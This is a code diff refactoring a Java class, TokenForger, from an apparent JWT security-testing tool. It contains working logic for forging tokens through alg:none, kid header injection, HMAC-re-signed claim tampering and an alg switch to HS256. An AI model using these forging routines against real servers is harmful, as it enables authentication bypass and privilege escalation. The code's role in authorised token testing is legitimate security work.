@@ -2,10 +2,12 @@ package com.tk.jwtinspector.detection.analysis.forge;
 
 import com.nimbusds.jose.JWSAlgorithm;
 import com.nimbusds.jose.util.Base64URL;
+import com.nimbusds.jose.util.JSONObjectUtils;
 
 import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
 import java.util.List;
+import java.text.ParseException;
 
 /**
  * Author: TK
@@ -36,14 +38,11 @@ public class TokenForger {
                 return ForgedToken.failure(ForgeAttack.ALG_NONE, "Token has fewer than 2 segments");
             }
 
-            // Decode original header, override alg, re-encode
-            String originalHeader = Base64URL.from(parts[0]).decodeToString();
-            String newHeader = replaceAlgInHeader(originalHeader, "none");
-            String newHeaderB64 = encodeUrlSafe(newHeader);
+            //Decode header, force alg to none, re-encode. Payload unchanged;
+            //alg:none tokens end with a trailing dot and an empty signature.
+            JwtHeader header = JwtHeader.fromSegment(parts[0]).put("alg", "none");
+            String forged = header.toSegment() + "." + parts[1] + ".";
 
-            // Payload unchanged, signature empty. alg:none tokens end with a
-            // trailing dot and an empty signature segment: header.payload.
-            String forged = newHeaderB64 + "." + parts[1] + ".";
 
             List<String> warnings = List.of(
                     "Succeeds only against servers that accept alg:none.",
@@ -73,18 +72,15 @@ public class TokenForger {
 
             }
 
-            String originalHeader = Base64URL.from(parts[0]).decodeToString();
-            String newHeader = setOrReplaceKid(originalHeader, maliciousKid);
-            String newHeaderB64 = encodeUrlSafe(newHeader);
-
-            // Re-sign header.payload with the secret
-            String signingInput = newHeaderB64 + "." + parts[1];
-            String alg = extractAlg(newHeader);
-            String macAlg = jcaName(alg);
+            JwtHeader header = JwtHeader.fromSegment(parts[0]).put("kid", maliciousKid);
+            String macAlg = jcaName(header.alg());
             if (macAlg == null) {
                 return ForgedToken.failure(ForgeAttack.KID_INJECTION,
-                        "Algorith " + alg + "is not HMAC; Kid injection requires HMAC re-signing");
+                        "Algorith " + header.alg() + "is not HMAC; Kid injection requires HMAC re-signing");
             }
+
+            // Re-sign header.payload with the secret
+            String signingInput = header.toSegment() + "." + parts[1];
 
             byte[] signature = hmac(macAlg, secret.getBytes(StandardCharsets.UTF_8),
                     signingInput.getBytes(StandardCharsets.US_ASCII));
@@ -118,12 +114,20 @@ public class TokenForger {
                         "Token has fewer than 2 segments.");
             }
 
-            String originalHeader = Base64URL.from(parts[0]).decodeToString();
-            String alg = extractAlg(originalHeader);
+            String alg = JwtHeader.fromSegment(parts[0]).alg();
             String macAlg = jcaName(alg);
             if (macAlg == null) {
                 return ForgedToken.failure(ForgeAttack.CLAIM_TAMPER,
                         "Algorithm " + alg + " is not HMAC; claim tampering requires HMAC re-signing");
+            }
+
+            // Reject invalid JSON up front - a valid-signed token wrapping broken
+            // JSON just gets bounced by the server with a confusing error
+            try {
+                JSONObjectUtils.parse(newPayloadJson);
+            }
+            catch(ParseException e) {
+                return ForgedToken.failure(ForgeAttack.CLAIM_TAMPER, "Payload is not valid JSON: " +e.getMessage());
             }
 
             String headerB64 = parts[0]; // header unchanged
@@ -174,9 +178,7 @@ public class TokenForger {
             }
 
             // Force the header algorithm to HS256 so the server runs HMAC verification.
-            String originalHeader = Base64URL.from(parts[0]).decodeToString();
-            String newHeader = replaceAlgInHeader(originalHeader, "HS256");
-            String newHeaderB64 = encodeUrlSafe(newHeader);
+            String newHeaderB64 = JwtHeader.fromSegment(parts[0]).put("alg", "HS256").toSegment();
 
             // Optionally tamper the payload (e.g. flip admin:true); otherwise keep it.
             String payloadB64 = (newPayloadJson == null || newPayloadJson.isBlank())
@@ -220,47 +222,6 @@ public class TokenForger {
         if ("HS384".equalsIgnoreCase(alg)) return "HmacSHA384";
         if ("HS512".equalsIgnoreCase(alg)) return "HmacSHA512";
         return null;
-    }
-
-    /**
-     * Naive JSON edit: finds "alg":<value> and replaces the value.
-     * Sufficient for JWT headers which are always shallow flat objects.
-     */
-    private String replaceAlgInHeader(String headerJson, String newAlg) {
-        // Handles both "alg":"X" and "alg": "X" (with optional space around the colon).
-        // NOTE: the ':' in the pattern is required — without it this never matches a
-        // real header and the alg is silently left unchanged.
-        return headerJson.replaceAll(
-                "\"alg\"\\s*:\\s*\"[^\"]*\"",
-                "\"alg\":\"" + newAlg + "\""
-        );
-    }
-
-    /**
-     * If header has a kid, replace its value. If not, inject one.
-     * Same shallow-JSON assumption as replaceAlgHeader.
-     */
-    private String setOrReplaceKid(String headerJson, String newKid) {
-        // Escape special regex/JSON chars in the user-supplied kid
-        String escapedKid = newKid
-                .replace("\\", "\\\\")
-                .replace("\"", "\\\"");
-
-        if (headerJson.matches(".*\"kid\"\\s*:.*")) {
-            return headerJson.replaceAll(
-                    "\"kid\"\\s*:\\s*\"[^\"]*\"",
-                    "\"kid\":\"" + escapedKid + "\""
-            );
-        }
-        // Insert kid before the closing brace
-        return headerJson.replaceFirst("\\}\\s*$", ",\"kid\":\"" + escapedKid + "\"}");
-    }
-
-    private String extractAlg(String headerJson) {
-        java.util.regex.Matcher m = java.util.regex.Pattern
-                .compile("\"alg\"\\s*:\\s*\"([^\"]+)\"")
-                .matcher(headerJson);
-        return m.find() ? m.group(1) : null;
     }
 
     private String encodeUrlSafe(String input) {
